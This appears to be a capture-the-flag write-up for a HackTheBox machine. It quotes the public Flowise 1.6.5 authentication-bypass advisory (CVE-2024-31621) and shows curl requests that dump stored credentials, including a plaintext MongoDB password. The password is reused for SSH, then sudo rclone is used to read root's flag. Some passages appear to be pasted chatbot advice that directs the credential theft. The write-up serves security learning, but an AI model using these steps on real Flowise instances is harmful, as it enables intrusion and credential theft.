
![image](https://github.com/user-attachments/assets/c892a871-3be9-48d6-a05d-72082e7f6d5b)

![image](https://github.com/user-attachments/assets/84b4f90f-c94c-4197-b644-9062beec7f75)

```
 Exploit Title: Flowise 1.6.5 - Authentication Bypass
# Date: 17-April-2024
# Exploit Author: Maerifat Majeed
# Vendor Homepage: https://flowiseai.com/
# Software Link: https://github.com/FlowiseAI/Flowise/releases
# Version: 1.6.5
# Tested on: mac-os
# CVE : CVE-2024-31621

The flowise version <= 1.6.5 is vulnerable to authentication bypass
vulnerability.
The code snippet

this.app.use((req, res, next) => {
>                 if (req.url.includes('/api/v1/')) {
>                     whitelistURLs.some((url) => req.url.includes(url)) ?
> next() : basicAuthMiddleware(req, res, next)
>                 } else next()
>             })


puts authentication middleware for all the endpoints with path /api/v1
except a few whitelisted endpoints. But the code does check for the case
sensitivity hence only checks for lowercase /api/v1 . Anyone modifying the
endpoints to uppercase like /API/V1 can bypass the authentication.

*POC:*
curl http://localhost:3000/Api/v1/credentials
For seamless authentication bypass. Use burpsuite feature Match and replace
```
http://ai.apolo.htb/API/V1/VERSION
![image](https://github.com/user-attachments/assets/10909d55-c935-47c4-b319-a3a4553c7011)


![image](https://github.com/user-attachments/assets/4407a56a-943b-491a-8552-adf664ca5baa)

```
[
    {
        "id": "6cfda83a-b055-4fd8-a040-57e5f1dae2eb",
        "name": "MongoDB",
        "credentialName": "mongoDBUrlApi",
        "createdDate": "2024-11-14T09:02:56.000Z",
        "updatedDate": "2024-11-14T09:02:56.000Z"
    }
]

```

The response you received suggests that you've successfully exploited the authentication bypass vulnerability (CVE-2024-31621) on the endpoint http://ai.apolo.htb/API/V1/credentials. Here's a breakdown of what you obtained and how to proceed:

Next Steps for Further Access
1. Inspect the mongoDBUrlApi Credential
Test whether http://ai.apolo.htb/API/V1/credentials/<id> or similar endpoints exist to fetch the complete credentials. For example:

bash
Copy code
curl http://ai.apolo.htb/API/V1/credentials/6cfda83a-b055-4fd8-a040-57e5f1dae2eb
If successful, the response might include sensitive details like the MongoDB connection string or credentials.
```
{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z","plainDataObj":{"mongoDBConnectUrl":"mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true&w=majority"}}%                 
```

ssh lewis@10.129.244.14
![image](https://github.com/user-attachments/assets/ef8929c2-153a-491c-8e45-c933aed5a29d)

![image](https://github.com/user-attachments/assets/5dff73e3-4d1f-4579-a3b6-d8721c6bbaf4)

HTB{llm_ex9l01t_4_RC3}

Identify Available Privileges: In some systems, you might be able to run certain commands as root via sudo without needing a password. For example, if your user can run rclone without a password, it may be possible to use rclone to read files with elevated privileges:

bash
Copy code
sudo rclone cat /root/root.txt
![image](https://github.com/user-attachments/assets/5a09b98a-175f-42ba-beb9-f52419bd43fa)

![image](https://github.com/user-attachments/assets/ddff1a87-0316-46b1-898b-8262b49d972c)

HTB{cl0n3_rc3_f1l3}

